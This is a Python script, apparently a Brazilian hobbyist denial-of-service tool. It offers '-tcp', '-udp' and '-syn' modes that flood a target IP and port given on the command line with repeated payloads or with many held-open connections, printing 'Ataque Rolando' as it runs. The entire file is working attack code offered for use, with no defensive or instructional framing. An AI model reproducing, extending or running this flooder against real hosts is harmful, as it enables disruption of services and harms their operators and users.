#!/usr/bin/python
#
#                          __            __           _             __
#       ________  _____   / /___  ______/ /___       (_)_  ______  / /_____
#      / ___/ _ \/ ___/  / __/ / / / __  / __ \     / / / / / __ \/ __/ __ \
#     (__  )  __/ /__   / /_/ /_/ / /_/ / /_/ /    / / /_/ / / / / /_/ /_/ /     by Amazonas Desenvolvimento
#  (_)____/\___/\___/   \__/\__,_/\__,_/\____/  __/ /\__,_/_/ /_/\__/\____/
                                            


import socket
from time import sleep
from sys import exit, argv
from thread import start_new_thread

data = u"00011001 11010011 10101001 01110000 00010000 00011010 11011111 10001111 01011001 00100000"

def tcp(ip, porta, time):
	count = ""
	tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tcp.connect((ip, porta))
	sizeb = data * time + "\r\n"
	for i in range(0, time):
		count += sizeb
		print("[Bytes: {} | {}:{}] Ataque Rolando.".format(len(count), ip, porta))
		try:
			tcp.send(sizeb)
		except socket.error:
			tcp.close()
			tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			tcp.connect((ip, porta))


def udp(ip, porta, time):
	count = ""
	sizeb = data * time + "\r\n"	
	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
	udp.connect((ip, porta))		
	for ia in range(0, time):
		count += sizeb 
		print("[Bytes: {} | {}:{}] Ataque Rolando.".format(len(count), ip, porta))			
		try:
			udp.send(sizeb)
		except socket.error:
			udp.close()
			udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		
			udp.connect((ip, porta))

def conn(i, ip, porta):
	try:
		syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		syn.connect((ip, porta))
		sleep(10000)
		syn.close()
	except socket.error:
		pass
def syn(ip, porta, time):
	count = 0
	for i in range(0, time):
		count += i
		print("[Conexoes: {} | {}:{}] Ataque Rolando.".format(count, ip, porta))
		start_new_thread(conn, (0, ip, porta))
		sleep(0.01)


def main():
	print('''

	
                                                                                   
     /\                                                                            
    /  \   _ __ ___   __ _ _______  _ __   __ _ ___                                
   / /\ \ | '_ ` _ \ / _` |_  / _ \| '_ \ / _` / __|                               
  / ____ \| | | | | | (_| |/ / (_) | | | | (_| \__ \                               
 /_/ ___\_\_| |_| |_|\__,_/___\___/|_| |_|\__,_|___/                      _        
    |  __ \                               | |     (_)                    | |       
    | |  | | ___  ___  ___ _ ____   _____ | |_   ___ _ __ ___   ___ _ __ | |_ ___  
    | |  | |/ _ \/ __|/ _ \ '_ \ \ / / _ \| \ \ / / | '_ ` _ \ / _ \ '_ \| __/ _ \ 
    | |__| |  __/\__ \  __/ | | \ V / (_) | |\ V /| | | | | | |  __/ | | | || (_) |
    |_____/ \___||___/\___|_| |_|\_/ \___/|_| \_/ |_|_| |_| |_|\___|_| |_|\__\___/ 
                                                                                   

	\t[Ataques: -syn, -tcp, -udp]

	Example usage: python main.py (ip) (porta) (tempo MS) (ataque)

	by Vivaldo Chagas.''')

	if(len(argv) > 2):
		ip = argv[1]
		porta = int(argv[2])
		time = int(argv[3])
		ataque = argv[4]

		if ataque == "-syn":
			syn(ip, porta, time)
		elif ataque == "-tcp":
			tcp(ip, porta, time)
		elif ataque == "-udp":
			udp(ip, porta, time)
		else:
			print("\n[!] Ataque nao encontrado!")
	else:
		print("\n[!] Nenhum parametros foi passado, revise seu comando!")
main()
